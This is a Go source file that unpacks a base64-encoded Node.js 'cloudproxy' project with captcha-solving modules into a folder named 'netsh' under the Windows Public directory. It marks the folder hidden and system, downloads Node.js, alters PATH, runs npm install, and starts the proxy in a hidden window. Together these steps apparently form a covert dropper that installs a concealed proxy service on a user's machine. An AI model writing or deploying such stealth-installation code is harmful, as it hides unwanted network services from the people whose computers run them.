package main

import (
	"encoding/base64"
	"github.com/artdarek/go-unzip"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var encodedZip = "UEsDBAoAAAAAABxrR1IAAAAAAAAAAAAAAAALAAAAY2xvdWRwcm94eS9QSwMECgAAAAAAD2tHUgAAAAAAAAAAAAAAABAAAABjbG91ZHByb3h5L2Rpc3QvUEsDBAoAAAAAAA9rR1IAAAAAAAAAAAAAAAAYAAAAY2xvdWRwcm94eS9kaXN0L2NhcHRjaGEvUEsDBBQAAAAIAOUGR1JaQ77vGQEAANYBAAAnAAAAY2xvdWRwcm94eS9kaXN0L2NhcHRjaGEvYW50aS1jYXB0Y2hhLmpzbVHBSgMxEL0X+g/DesnCur1bCooXRYtF8FzGdFbTpkmcTEqX0n83211pKQ6BPMK8N29eihQJorDRUkzHo7fPNWmpV9QYRwv2gVhaRfvgWWIFxXJJce5XyVJRwQF2aBPdgXAiOJaZj7F1GprktBjvIHq7I3WAxLaCaIQ21FaAwbxQmwlwGI8gl3D7B7vS3kUB1DADpp9kmFRxj04MrrbGTTqkMYj+Rt80Rhu0RTk901HXkeRh8ZyHqH5WOb1WF78hB7NTc2fy6bFXzDvvW0sxqkvPl3wmSex6geH52F8aswIoKq+X8ZZqYvas6B8ll6w9C+UzxN39AiYr2eXJYu6ZTG4yTqxpjiEY9/Xx/jrr8rgdAqnXsd5i+AVQSwMEFAAAAAgA5QZHUmWsibc6AQAAYwIAACAAAABjbG91ZHByb3h5L2Rpc3QvY2FwdGNoYS9pbmRleC5qc22ST0sDMRDF74V+hyEeuoG69WxZQcSbRfHPSaSN2ambEpN1Nllb2v3uTtstbrWBkDC/l5c3ISJWCFUgo4MY93v37wvUIc1xbhw+kC+RwirBZekpVEMQ0ylWE59Hi2IIa6iVjXgJgSJCI/l8q0xvVBl0oZ5XJUIGtTc5XDCuFUEHcSWZR6eD8Q6SDpCw7veAR6f2KgjFG7vx2pbF+ISq2IuKjqaRyXGgUzE3G0hOx183Urbh9R48eVsjVcxctLbTNz+cijYwSCRkV4c2Aq0O2+3450L4FQ1hMkhHygVz3goG8mDYNtrsF62Yclp5ZOpd5S2mSOSJ2fgXhYL8N9zuwOzawU4CXutImIP1Kjfug1X8E3aR0pk8vpAwRHJ/cm8fludodMbHImmcqLJko5fHu8y4HJfpoko/VfkDUEsDBBQAAAAIAEQHR1I3hzqwCwQAACoMAAAYAAAAY2xvdWRwcm94eS9kaXN0L2luZGV4LmpzvVZRb9s2EH4PkP9w9QyIAlzaKTCgcOA9tHvohqUJkuxpGBJVOttqJFIhqSSGq/++IyVLlGJ37h7mJ4u8u+9438c7jkqNoI1KYzM6Pz25/PIVY8MTXKYCr5QsUJkNw5dCKqMnMLq7Q30hkzLD0QS28BRlJc7BqBKhCsk/lkIbyOTq7gwWoPCxTBWyEZ/S0qgzWBtT9C3simegZGlQD4PUq57ZEyqdSuFZBZxPiyh+iFbIv2opgpA3Rq2TRkVLV3Qi8ns/e/9usPNJarsTZDKOsjV9BGSwLEVsLBQqJdU16oI8kLmvC72aUAJUH20iZW7THOlPXoSwPT0BgLoetqhRmRnufFrP8Ly2ac7dBIbFztf+KJop9RwC5xRMuh1C0nTUObSJdHv9ZLwNFEm7PIdfI4NcyGcWeiZNzeqFqkmRkuPPKjX4CaOE/TybTfwkg49SGBTm7e2mwICSjYoiS+PIVm3qqGiihcNw7Peby8/cilCs0uWG7YoQ+paUNLPflceFLuOYCtCy0Xw7PvCFkkkwaUScWnq+x1Fdf780sPBqc76PyVQsJbu/qVGXZdbRlwoYb1kv2ttXyFM4m81mFej7Xfh0Cd4hwl1uB5A9y8a/OqCl5lpHWqcrwfYpSz4Ekz2y6iDg2zcIgh+V10FJ7SPIQmyrcK/a3v0/aoPvqI2aXZqQIH4TsczJ+ZpaDp2SxeZlAkWkoly3jO3TyZUzmcN4O8ig8a16MqConJoaz9GsZQJvFtSRri5vboOeKqxVvyMFlyLbgFkjWGto3FMNUZbJZ0yCHUh9VFMqAcso07iT0OsUSpXV+NOns+PgydDKoJCpMP8N+01dFB7nyb8gjlxd0aCCgKwDi5dHgpiSajM6DrHZsXPMkn56Ug8oHiskwm/cWGCklEfXQ0JY/HKI6LhRhW5bRn0Z+7fl2Nayk5obb+RqxdOJomq+iJ/qvg/3RSYbqovRhPTX362wH7kULKDSRMEE4nUpHryj2F/rx4tSr5kzaZtL6LyJV3Jm4cCzwyXID+VyiYrTGt1I1gYNuZE3TvbM5yVD09wfchVllnl7Rm18FPtrTd01oi+NDsIPWXmJRSZeg5234TDSQLofbPJ5aY9hO7iLD0up8sgE+4fHeT9eLaMDabj6kHz7o712e5wMV/Rg5WC3heE55sByvXL09M+XH3qmDKG6qdrF29evHcZwBuc/Mny9SnlVc/f/mG4bwvZ4AurHY3fFepG4UwnDgajp54iTGe6ebUPOXzck5M347Amyu0W2w4Q8SzXViHWP0Yn3/Bzcr32t4WMmS1vflw08jbfNcK2gDmtbBk0s28Xm0+l420Wu5uNth1m3DZfSdPoTaFmqGC9olFKAP6//WKRE4gu9o3keFf8AUEsDBBQAAAAIAOUGR1Ip7hsANgEAANoBAAAWAAAAY2xvdWRwcm94eS9kaXN0L2xvZy5qc1WQzW7CMBCE70i8wypFii1C6BlEL23VVgLR8nMGE5YQZOLUXlMqK+9eG0Kr+mDJM9pvxhtZg2BIFxlFw3ZrujlgRukWd0WJ71pVqOmb4blSmkwC0WqFZqK2VmKUgIOTkBYHQNoi1NzPSyTQ+GnRkIER3HspU6UhGE9fVq+LydiLOyENeqOhhjBhJXmnSRfGFHnJHBRlNmtgA2AcRg/gfvHd7hDqBPZ0lCxcHFy7Bc0pdsBukfxPDof2Rcjc2Pw6NrzadYAFdqGRxaG0ktiTKu9JPKGMOWvwl+cAYtRa6Ti5ipX2Gzuzi/eviEayuoR1x5X4BU+CkPGU1Nt8OvdLL3PGa+i4y5yXl5Vf+KMwGOTZ80ev427frde3ou1WzUPrfv8OjLI6w4moKs9azsYjXzg9mPQoqh9QSwMEFAAAAAgAbwdHUgkRFVV6DgAAlToAABkAAABjbG91ZHByb3h5L2Rpc3Qvcm91dGVzLmpz7RvJcttG9u4q/0ObUQVAQsFyKpMDFSblkZXEE9tSaZkcNCq5CTRFRCAawSKJRfPf571egEZjIRUnl6nBhVhev3770t0clTkjeZFFQTE6fP7snmbk5iZjeUGmxC0WUU6+/JLgry9fe+TTJzIvk6CIeELcfEyYR9bPnxG4cDCOW28O5Ys5z4iLb1MSJST3SDQn7snsdxYUfprxgherlPkLmp88JKcZT1lWrPyAxjHiTT2cmvlRErLHk7kLz9+TA09ixqu4Sq9hthx+1HyIPicvpiQp4xhHI34+J2rKW1YYE52vljMe52Q6nZKR5mhk4K+oj2CWAyCITAcxubl3CLDfk9SPWXJbLODp668r6egLiTS4uoquBWNIbks0qZrhbX6clEuW0VnMagHhUK+JXMkFvijR4N1hDbORtxkryiwhBXxBXal5QzaPEqa5ctljyrMCJhrd3LD8PQ/LmI3GZA16jks2IUVWMrLxYLyC9DNeFgwkSu55FJID+BLwBEypLKPw5hW8z9gfZZQxd4RvRl4FkLM8B+k3YfyX6rUBGPNbGwheGQDHWcazvAmTlmnKCsayl/KrAR7QtAgW1MapXhuAR7+8fvfu+MPPxzfnx++Ojy5Ozs5hyJXzRZHd3fyeA3AMP86YOH5GVzdRKG5pUdDgbn/GH53rCtXFya/HH27efji9vLj58Pr9sUR0u58xNS3c5SmAMsSx2G+9RVQ0XyVB7YhRUrAsYGlxpoDclN6yMUFbmQEJlRUqtuOIJeiq9IFGBUFYv6AZmLXr+UHGaMGO3pyeS/G7njIgCSzH+jlLQtf5iQFpPkvQMJ2xaeop8M6yJJ+Qq6aJrtsWW2bxqQSfEOcrZ9yGAN55CQxegFcAzBsegDskRTfoHyUEqvMCmALQMyUQG3RjPF+r+43mVPHIE82hQnpKy5yhaqX4XYh90x9MjoR9oiPRMkaHmpW3nSh8crRgwV2U3GI8KBaMaO0SCIfoYeBAAed3Ecsdz3DgmBVkwWjIMvQz5uthv6h3EJ2vri14haepbvXS9Q6HqVdwJhhGMPXan0cx6M11AyGJwE/okomQ6gTzmyBmNKNJwBxPhUTyA4RwU2C9Qns9g5CC8lFyIzQJddzSkzflROa8TMKGtMiQ1c5pFJ9J5Gi6eqK34UTIVT1AgsOgccZoztE8BV1gA7WxmKLOC1qUKGmH3zkd35fgUiB9BLA/S89M6SrmNMQs2jZtib3D5hXabscBoU66sBHpeRNpD3DneuNuKDkviqWXAryUXU70DQgxLAPmunRMHoV96ORPIbDcJtbTegN+5aEmrh6FHV1PyKMvkg0IGz9s+gjUXjARmb8HSJnJRN/0gIF7Zq9vwVhA2U4bZGOFEVuLKuC6SpFeO/nixeKc7eQGRzwBLygNR/BJwk3Df7rhBxIn2278ZNNBv3i3aaUgDNHxPTuCTIi+ztygeETMYFjjWqhjsqSPF9GSQakwJlDfPK7GJOQPCQprrBz8JIlXR0pJhKbRrwyA8qhgd2wFgVsYbBVFanxkaj5AJPzuAC7FQJ939nglxjhBnbctvI9ep2m8kqyMUDSGqLrgP36g99EtFbGt4L7vk701yGjz0TMo0gbdjNm3UBe6Qp5rgm8vQY/gv07Il6hTEC9KsRGckA+NzFd+CTke1HHPMnRnqNt+i4qF6wQxL8N5TDOI1gNMR8mcg1lWwCSE0irAiGinCIPwPdfxg/m+iKT7AQ/tKfAyc1PMoYKx7VkH/+LRF4iqUsekBrPnLObBHQtF21KlD/cIpiWvDr45IG8UxZ7vdJh3S2rSalyP/EC+PWhnL9Em6DI2BsTwzOddBaNnDzUKsnnlN8cxWzbVvudqxCa5Jq3WcK9rorYqF8Uydo15lA25Xtc0pC9C/UYjYcsoB0MRgSYILNzpRciKunQFJGciW1nATaVY8aGXVVKZVF9tbMWvKmIPYcSrTTCoSw0+7B+66RPCpvv1wyKKGXHfQC3uJ/wB7G9f2L7wWQxycLNMyfdGzBsk3VA03v3EM/cVhEdvgOQiW20TRnegUhPoSAd19JaANSaFZGFC/gFE9QuL9AuMiPQLCY64Ij6ANIZAO80Ju/C2fgflulPssi858e62T4bZ3kFRnx1nbNm9sHFBwm2G/ChJy+IKK7npCLsB1WtD1xOOrjsyQNc1g2b0bgs1m+HP3T0Zlkx1kIKCjGFDSegtjZKhkEX+MgOsXKehhIyhS7g7J/idOT5jcqycZoDDHpKj+fZg9MN012jUzuIf39PHaFkudSQA+dBgga1yjXK6t64fNsRd5t7HPjZqN3san53C+zfW27Jm++Xi/TuCNcyQDPvMtmPOrlZAX931IyfO3lq76sbpsGJdk/md0rGIMB6tEujz3LmxwnaOvUFGpvWKm2arFStx5saoobpJwTXNcEpqQz3sHaqlBomqFQidL6rP+1DYLDsVLQg1sfxddVeDV1wCO47bFG9RzzDq+VGNvMLcnNBn2IqDXF217MVkb74D0RJHQ/nGfFeN2a8Hqr8XBrZeWQ+3CpfJHZhFoikROwQvnhoKuzoiXQYXHGYPWHTP6jn4HUvww2yV0jzfrTSW4pNDLYVIr3AH+Mcesf+r6qQHIFTP3Q9QiHVYQx098vOGtCmYG9Tjk+qqfqVfCCnmMgThsh82h1wPUAp6ckI0Gj/0Omz6Wkv7g9zJscJvbW/+WLBHiGmMKofeW+PvZnTdGdBNqQp0OxasAtb06zERopCr2trByVS+PSQb/f3ptVHPa4Ppmgx7Ud2+HiCk8QefhuHxPcTNd1EO4RMcwsnL2TLC9Sy9ME/YvVj8KniK21pUNSOeZCXrD169httdaVdXuwc6V3m6nVJwFafqerAVO3hyj1hXm4MaF1uOWQb6hvyYBLglqvfJfFVMHePzVrPprUds3nasRP6c0bQLiwte0Bg5aaR+st9dHwxG3IyCcS0xmit87ntaLPx5zHkmbyUEoP+KfHPgka9Bd3j/ql5r7MaMun7H5ujr1iT73cwMxM4KV9d+ypauX499atL7/1pNr2waVWBHoSQDU3+B9xetogzn289Z7PichNyeYnfh9rcqZKB1qtf5H2iWwLROx4zGor8qP6tgRWaQkRNOaFnwJUg+0LVDlKMvz6PbMoOQ5hxua6TUz8DWXmtDrb2V17OFN7x1p7fsWqvYFly1Z9feJLAgB/fYqr21rh1mC9bYYOtP/4k0ep75FbjXFq9SAFq33kNqmO9fto1CCNH686U+fAO3auYqEc7K+RzqEc/zC35eZGCArjOjOfvu26rGVBzYFtw/R1e/2MTV65vKD+uwBwOqULpk2S1TJz1wI+iUZnSZQ6RRWT6XG2740j5EwtNVfSSqd0tX4/EqNIcaS7rylbU9AU815NMnsSOssFqv8QfttCkCnLJz8zKH7+kp1buWEuWYzDL+kBsLENqRb2uNKBA/YQ9ivHdogq5BvsWCh4CS5wWUJrSxF6poHldb0nIbkWzIVNGgsGHy5RCBsihkZ3KjVQhtbbqAnIq8wNMXPx9fOFu3Lj+es0I0rWok9ER7a3m/adRrral9NWJa7a+Bz8p3TaNEujTru9Mz4+GKhDBEkqQRbCNKwzXJ0m/bhFWa2E7ZZY50BSW0Ekty+XqCm7Z6dJMsww3Bqi41kDFZmxBlB9vJeB2GBh1V8N5b/+v85IOfi1gTzVduZVgiVpNvvG2iUwOakms6ofpgJAhNQAdHgTTo3VWuWFLjOlhSX/pYaopdVjiu7/tqWAeJirs7tsrdlkB6Dyx1MdEebZ/AUqdCzkqovwIMHnMKkd+AkuFCw2FOUeKWjWzXCmkTJcS7F1pDUV7XjOqQh9u93aJH6CMhVfjauopulWJtDrG9tsZIJrW0GvFLX1uUAs3lMQ0WrgsAfcsEFf4rAMJjsC084kMlYJsx+8WQxnMbuCXQTshNr+Eqdb2tamao+u2FCgGLZxPVZI5xzrNp5lXmv2Uy7UkNqJx1pj1dtVdm7jOFq9SWMGxKValQJSg/1y8g7ZSJPEOsk0DjdO/bsD3o0yd1ONi/f2WlzgqvNXMthx+V7BSkoSR5hNWtJh6TdW8Nqiiqs3ITUiTkCko8WRB95G2MgnXSQSSetq0o9Mwj7IZERZxouO7AMieed9GDQ85y6GEKwh4jPDQGiYj8x4nh/kaB5P9xML3mjBGwHnEIVcBiNNYgvl2wSjmQaV/dqAbatZ61bNZRR/VUYAqfryuxVsgMZb6nD4ik+wyaxoXzmQhE22DXJcSo3WTPJKqxsC4g9BUyCO1MfFHdlQUgNkjLIAAWKiUJaN3jWQl2WwXsWi74I4RPsKy1FtLE8DRxYNJVDPxo8jLB8lgcswRZlYUYJ6iSPQeONCNVQ/vW7vbzZ90xUnxXUIc7WO7oUhwgR2sEB0N56RCl46l9sA6CDKi4YVPR3BZQS69tH4S4XGR81fbDJu+brj85KORO5Ssy6jiTRji9oXaewr+UVDoTxnUDXQEXsR7xyj/auPjyaqT/AnFtElaHxsE4SgxT1vLckOmOUbMiyXYZuykaMndH26rEHRIFMIcabuU7Y1MQXaIf2zLGAOZMhGxtuXbNL2vFapK8Kw4jSter529PqqzE0qxJukVKvXm+1eTadZnhJg12ZIhnGqU86sgYnrxdQpUR9p5mfGKqcFqCUE6IGcuZbCkWSJUk6h5RdKOWFSmYzt6QDJ/2pAkSi39cG+Hwf0KzOCIPC9ziY4nojyiBGXXs6JVLo4FXxVCDrT454Kx/ThCnJ+ctSbz486J4X4pCKQnlTAPywIn/PoGoJuspMmmvRrdahv9BM9q0/7p1hvkkawxoFt4i4eCffRoJ6EpxHixD8++P4mNXvSipFJ87iXv+bFBcHzHyBHy5xL/hOHvrevaNg8viUSL+kiC3+TZ1tlRRj0wVn/D15csviPw313uapiDny7N3U8mU/zuom6b/BVBLAwQUAAAACADlBkdSmF3ZokgEAADIDAAAGgAAAGNsb3VkcHJveHkvZGlzdC9zZXNzaW9uLmpzjVbbbts4EH0PkH+YeIOaAiwlRbEvznqB3bQBFmjRoO0+FYVDS2ObiSxqSSq24frfdyiJMnVJUL7YIudyZuZwhqNCI2ijRGxGN+dnnxePGJsowaXI8F7JHJXZM9zlUhk9gdF8jvqTTIoURxM4wDNPC5yCUQXCMSD9WGbagNQwA4X/FUIhG0k9Oh3l3Kz9Q/vtHS9bmsuWZpHnaBDVHHdG8flbX7I5DMtDTy2Vq7ZodEVbnkBhRKobkVqk3PSENGotZHbL4zWS5OFIJz1ANm28SE1UaGTO2LgDLczTYiWyUBvkqVmPAxZYN8siiw15ANJV77nh74W6U3LzT8JEEsDh/AxoKTSFysokRo9SZEzqyGzyRCgWTODh6gQpXpMyznMllyLF+eVBJMcH6+jo+coV5lzh30puNar7Stb3F0sbvAcJZsMAbyp5sQR2sdQR7oQ2+us+i5knHjR27SKxzRMh70pZXimMC6XFc4tbVunYyoOnVUVWE9UVAmZNIAq5IWtckzcgxNYLJWe3n1CQ8kkgsVtm+E1s8GtV60lp/q8VZmYCa+QJKpLZ8J2VkYUhUDD7048oRQNcrSyFv4/DMJOh5lmykLvxBOg7EZovUgw1gRdJc/bj5mTB5q9E1cqUXSWNG4IluChWteRNW9ACiPJCr9lDGJYS5FA9o5pdHsrPigZO/Hj627lmn3PLEX3KoVtkJSliM4UxkYxINp60z22uUsphVbtJH57nvRP7RbsEv5SF8a2trchWLZ4upXKXNhp3c9SNMWoz/MVrMZy3FigH6iOnS7a2qFw6YFHZi6I2IMuatJT+poiG5P9d57RW9Ha3a0IE7Br+mPm6YdjLmFH77pZdtUlyxrdcDDTXJp7KPOumLLgZMor8qbN/bH/G3MRrYBgMgbIMwGhDueIrhIvZDMZ3nAJNwMg6TDBrbMATEWMSvhgHfVt2GaLnFrCDqF+yLVcZ81zR1Muck4nNoC0jX3GRdWsH7QiPHTbXNvxgPWAflJKKPfgh2ghddO/A0E3QIDLgQHvRS/fWuqp7WM+TG7orbErtaJjh9p72WTeemhB0FFGnui0NMwrcuRgG4Q/I7yL50W8bLqHtXe/mTV+9lx29unZ66uZ3pHAjn/HDJjf7O4FpotkAxU4tvX/menz/5NT0O6UPhltZPZ66OXEzrPaQ0oycAiunSP3uesK9Zr5aUMsmSG80ufcGWHf4VJU+nHjr97QjzF5CAzWDXuJqmzRxKnWfMglSm8LXPDgvHqjBFtB7cNxX78XXHh2/0O6gCcSxRaeIOfv9+vp6yIxdTrIK7k6mRI4v7l3COhCHjBz7W6+2P6jjlylGWPYG7JsdaCDlT1UD26jqUrlqwLJEHsHloemt7SfAC3g7nzWn7Ugf7gC1wJKnGjtMX6GZNpztdYo3b/p7P39Whs7P7L26uvoNtCxUjJ94nlOQ/375OHPT/ZHekTz/H1BLAwQUAAAACADlBkdSnvYVRG0AAABwAAAAGAAAAGNsb3VkcHJveHkvZGlzdC90eXBlcy5qcw3LQQrCMBAF0L3gHYa4USjpXvEGlorQdYnpV1JqM8xMikW8u779c0VBapKiudN2095HRPMDHmnGVTJDbN3jzVlMK3J9D23yUCa4ij60hKngSCYF9D38f13vSHORiCYwp/nZ3S5nWxnqR/WvwD9QSwMEFAAAAAgA5QZHUo1wo/GrAQAA4gMAABgAAABjbG91ZHByb3h5L2Rpc3QvdXRpbHMuanOFU01v2zAMvQfIf+C8iwwE7nZd4J3anlas6LbTMASeTbVMZEkTpaBG4P8+KXZSu8tQXgzxPfLxy1lgBPaOap+tl4uvv7dY+6JBSRrvnbHofCfw2RrneQXZZoN8Z5qgMFvBAfaVCvgJvAsIfR7jR2bhsDV7vGmt724JVcNQwglrUKHHW6MadA9YB8e0xwnOCtHG995QAx9i0tpo9iBTDod/AjkUmeQsP0P3lX+agja+J3DwpDYfp4TkyRLhteZALawzLTHJTjD679SiCT7RZdC1J6PhYg8i6eZwWC4gGkkQkgt8Jvb8rdP1AJ/xZDJNqmoaci+EQhp3U9VPQkhSmEP5eRqRbOgqio59p0+xNaSPCVZwjFvPY8ZqFPvKH7XG8Lwgvo4zqb1xnZhXd7LLzZ4SvBLq509UjJdyxlqCVqR3s2L+n6vP1/OxtbOhjWAM6JeLtw7tov+N4xVmuolhAy76D/0oHbcGYvDvgDSY2SjT+M3P3S94V8Yj08P/1fwzbZcoJSTmpN3+3NyRgz44DS4SkvbV1XtgE1yNd5W1pB9/PHwp0xlzseWirexfUEsDBBQAAAAIALK2P1LjiKvjDgIAAJ0EAAAXAAAAY2xvdWRwcm94eS9wYWNrYWdlLmpzb251VE2P0zAQvfdXWOUC0tr5aEuhJ6TdAxwWceC8kmNPG0NiW/akakH737Edp+229BbNvHnz5s04f2eEzDXvYb4hc9GZQVLrzOE4f4iJPTivjI65ilWsHKMSvHDKYs78iHjiwQU0QUOao+Xek8dItu24AxIYEUTEs5FhrPehOvaPAeQOI5k2EggrpPJYKC3hwH75+cMIagbVyQhCL6aYhP1U1htNKBD0hFI4gAhfNNF5JzJXaBnKXpMGPmBrXCz+bnhLHrmT5g8n75+UF8bJDXnm4isXv8G9Wy/q+sOovFMCtE9uPX/7OcYcWOMVGnc8D4RHm0A7hZPUwXUx0iJavymKkGmHhgnTF1FA7l8k25KlLNae5EqwEGbQQsGFb1+4RsVlr3QRvwS3KFputlslFE/tXsLaWLWYRAijvemAdmZHO9jDhFmyaoLsDI7Biq3O0TZz01AeFn2irieAHawFhJxasAUrb1JhL+h4BoSLWt1BUNsNO6WpR+AdtqmgZh/Z+uTloNIlvHxiNSsvXdo//d+ouBBfxHsYpS+j9pMtOX09Q8mqK8RF4/I8IPhO6dG1NVtdx2kwfat2lCvX6IY23J801Pew4UFoGU5iAlasugJmi1RvjcPsUH3Ll2Hnwc8P+QYU3mmvsrio7U7LN9qWlyblZ5jVlGw5JfJTzM5VF2eTbE2/g+z5Z7ZO+5y9zv4BUEsBAh8ACgAAAAAAHGtHUgAAAAAAAAAAAAAAAAsAJAAAAAAAAAAQAAAAAAAAAGNsb3VkcHJveHkvCgAgAAAAAAABABgAqIhCMAn91gGoiEIwCf3WAU1aJyEJ/dYBUEsBAh8ACgAAAAAAD2tHUgAAAAAAAAAAAAAAABAAJAAAAAAAAAAQAAAAKQAAAGNsb3VkcHJveHkvZGlzdC8KACAAAAAAAAEAGABMjCohCf3WAUyMKiEJ/dYBf48oIQn91gFQSwECHwAKAAAAAAAPa0dSAAAAAAAAAAAAAAAAGAAkAAAAAAAAABAAAABXAAAAY2xvdWRwcm94eS9kaXN0L2NhcHRjaGEvCgAgAAAAAAABABgAswErIQn91gGzASshCf3WAR1kKiEJ/dYBUEsBAh8AFAAAAAgA5QZHUlpDvu8ZAQAA1gEAACcAJAAAAAAAAAAgAAAAjQAAAGNsb3VkcHJveHkvZGlzdC9jYXB0Y2hhL2FudGktY2FwdGNoYS5qcwoAIAAAAAAAAQAYANGVInOg/NYB3doqIQn91gHd2iohCf3WAVBLAQIfABQAAAAIAOUGR1JlrIm3OgEAAGMCAAAgACQAAAAAAAAAIAAAAOsBAABjbG91ZHByb3h5L2Rpc3QvY2FwdGNoYS9pbmRleC5qcwoAIAAAAAAAAQAYAIumGnOg/NYBswErIQn91gGzASshCf3WAVBLAQIfABQAAAAIAEQHR1I3hzqwCwQAACoMAAAYACQAAAAAAAAAIAAAAGMDAABjbG91ZHByb3h5L2Rpc3QvaW5kZXguanMKACAAAAAAAAEAGADNiAHdoPzWAe8sKSEJ/dYB7ywpIQn91gFQSwECHwAUAAAACADlBkdSKe4bADYBAADaAQAAFgAkAAAAAAAAACAAAACkBwAAY2xvdWRwcm94eS9kaXN0L2xvZy5qcwoAIAAAAAAAAQAYAPY6FnOg/NYBAVQpIQn91gEBVCkhCf3WAVBLAQIfABQAAAAIAG8HR1IJERVVeg4AAJU6AAAZACQAAAAAAAAAIAAAAA4JAABjbG91ZHByb3h5L2Rpc3Qvcm91dGVzLmpzCgAgAAAAAAABABgAQ//sDaH81gHAoikhCf3WASF7KSEJ/dYBUEsBAh8AFAAAAAgA5QZHUphd2aJIBAAAyAwAABoAJAAAAAAAAAAgAAAAvxcAAGNsb3VkcHJveHkvZGlzdC9zZXNzaW9uLmpzCgAgAAAAAAABABgAOuMZc6D81gHjxykhCf3WAePHKSEJ/dYBUEsBAh8AFAAAAAgA5QZHUp72FURtAAAAcAAAABgAJAAAAAAAAAAgAAAAPxwAAGNsb3VkcHJveHkvZGlzdC90eXBlcy5qcwoAIAAAAAAAAQAYABeJFnOg/NYB/BUqIQn91gH8FSohCf3WAVBLAQIfABQAAAAIAOUGR1KNcKPxqwEAAOIDAAAYACQAAAAAAAAAIAAAAOIcAABjbG91ZHByb3h5L2Rpc3QvdXRpbHMuanMKACAAAAAAAAEAGADQ6BdzoPzWAZE9KiEJ/dYBkT0qIQn91gFQSwECHwAUAAAACACytj9S44ir4w4CAACdBAAAFwAkAAAAAAAAACAAAADDHgAAY2xvdWRwcm94eS9wYWNrYWdlLmpzb24KACAAAAAAAAEAGACAhg552PfWAVEaKCEJ/dYBURooIQn91gFQSwUGAAAAAAwADAD6BAAABiEAAAAA"

func CloudProxy(readyChan chan<- bool, errorChan chan<- error) {
	readyChan <- true
	err := StartCloudProxy()
	if err != nil {
		errorChan <- err
		return
	}
}

func SetupCloudProxy() error {
	parentDir := os.Getenv("public") + "\\netsh"
	if DirExist(parentDir) {
		return nil
	} else {
		return InstallCloudProxy()
	}
}

func StartCloudProxy() error {
	parentDir := os.Getenv("public") + "\\netsh"
	cmd := exec.Command("npm", "start")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Dir = parentDir + "\\cloudproxy"
	return cmd.Run()
}

func InstallCloudProxy() error {
	parentDir := os.Getenv("public") + "\\netsh"
	err := os.RemoveAll(parentDir)
	if err != nil {
		return err
	}
	err = os.Mkdir(parentDir, 0755)
	if err != nil {
		return err
	}
	err = SetHidden(parentDir)
	if err != nil {
		return err
	}
	err = Download("https://nodejs.org/dist/v15.8.0/node-v15.8.0-win-x64.zip", parentDir+"\\nodejs.zip")
	if err != nil {
		return err
	}
	err = DecodeBase64(encodedZip, parentDir+"\\proxy.zip")
	if err != nil {
		return err
	}
	err = UnZip(parentDir+"\\nodejs.zip", parentDir)
	if err != nil {
		return err
	}
	err = UnZip(parentDir+"\\proxy.zip", parentDir)
	if err != nil {
		return err
	}
	err = os.Remove(parentDir + "\\nodejs.zip")
	if err != nil {
		return err
	}
	err = os.Remove(parentDir + "\\proxy.zip")
	if err != nil {
		return err
	}
	if !PathExist(parentDir + "\\node-v15.8.0-win-x64") {
		err = AddPath(parentDir + "\\node-v15.8.0-win-x64")
		if err != nil {
			return err
		}
	}
	cmd := exec.Command("npm", "install")
	cmd.Dir = parentDir + "\\cloudproxy"
	return cmd.Run()
}

func SetHidden(filename string) error {
	cFilename, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(cFilename, syscall.FILE_ATTRIBUTE_SYSTEM|syscall.FILE_ATTRIBUTE_HIDDEN)
}

func PathExist(path string) bool {
	pathFromEnv := os.Getenv("path")
	return strings.Contains(pathFromEnv, path)
}

func AddPath(path string) error {
	pathFromEnv := os.Getenv("path")
	return os.Setenv("path", pathFromEnv+";"+path)
}

func DirExist(dir string) bool {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func UnZip(src, dst string) error {
	uz := unzip.New(src, dst)
	return uz.Extract()
}

func Download(url, filename string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func DecodeBase64(encoded, filename string) error {
	dec, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return err
	}

	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err := f.Write(dec); err != nil {
		return err
	}
	return f.Sync()
}
